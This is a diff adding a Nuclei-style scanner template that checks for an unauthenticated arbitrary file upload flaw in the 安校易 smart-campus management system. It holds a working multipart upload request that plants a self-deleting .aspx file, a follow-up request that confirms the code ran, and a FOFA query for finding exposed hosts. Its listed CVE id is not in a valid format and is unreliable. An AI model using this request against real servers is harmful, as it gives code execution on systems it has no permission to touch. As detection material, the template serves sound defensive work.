@@ -1,0 +1,52 @@
+id: 2024-105251150
+
+info:
+  name: 智慧校园(安校易)管理系统 FileUpProductupdate.aspx 任意文件上传漏洞
+  author: k3ppf0r
+  severity: critical
+  description: |  
+    智慧校园(安校易)管理系统存在任意文件上传，未经身份验证的攻击者可通过此漏洞获取服务器权限。
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/139174072?spm=1001.2014.3001.5502
+  remediation: |
+    打对应补丁，重启服务
+  classification:
+    cve-id: 2024-105251150
+    cvss-score: 9.5
+    cwe-id: CWE-434
+  metadata:
+    date: 2024-05-24
+    version: 安校易
+    fofa-query: title="智慧综合管理平台登入"
+  tags: fileupload,rce
+
+http: 
+  - raw:  
+    - |
+      POST /Module/FileUpPage/FileUpProductupdate.aspx HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+      Accept: application/json, text/javascript, */*; q=0.01
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,
+      X-Requested-With: XMLHttpRequest
+      Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
+      Connection: close
+      
+      ------21909179191068471382830692394
+      Content-Disposition: form-data; name="Filedata"; filename="qaz.aspx"
+      Content-Type: image/jpeg
+      
+      <%@Page Language="C#"%><%Response.Write("hello");System.IO.File.Delete(Request.PhysicalPath);%>
+      ------21909179191068471382830692394--
+
+    - |
+      GET /Upload/Publish/000000/0_0_0_0/update.aspx HTTP/1.1
+      Host: {{Hostname}}
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "hello")'
+        condition: and
